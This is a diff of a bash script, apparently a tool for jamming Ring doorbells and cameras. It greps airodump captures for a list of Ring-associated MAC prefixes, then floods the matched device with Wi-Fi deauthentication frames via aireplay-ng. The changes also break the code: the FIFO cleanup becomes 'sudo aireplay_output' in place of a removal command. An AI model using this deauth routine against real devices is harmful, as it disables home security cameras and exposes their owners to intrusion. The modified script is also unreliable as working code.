@@ -123,10 +123,8 @@ sleep 1; clear
 airodump_scan
 
 # Search for ring devices
-RESULT=$(ls /tmp/rdos | grep -E "airodump-[0-9]+\.csv")
-
 # Check if any devices match the filter
-if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/$RESULT; then
+if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*; then
     while true; do
         clear
         printf '\e[1m\e[31mNo ring devices found!\n\e[0m'
@@ -203,7 +201,7 @@ clear
 # done
 
 # Create a named pipe (FIFO)
-sudo mkfifo /tmp/rdos/aireplay_output
+sudo mkfifo aireplay_output
 
 # Start aireplay-ng in the background and tee its output to the named pipe
 sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee aireplay_output &
@@ -236,7 +234,7 @@ while read -r aireout; do
 done < aireplay_output  # Read from the named pipe
 
 # Cleanup: Close the named pipe
-sudo rm /tmp/rdos/aireplay_output
+sudo aireplay_output
 
 custom_exit
 
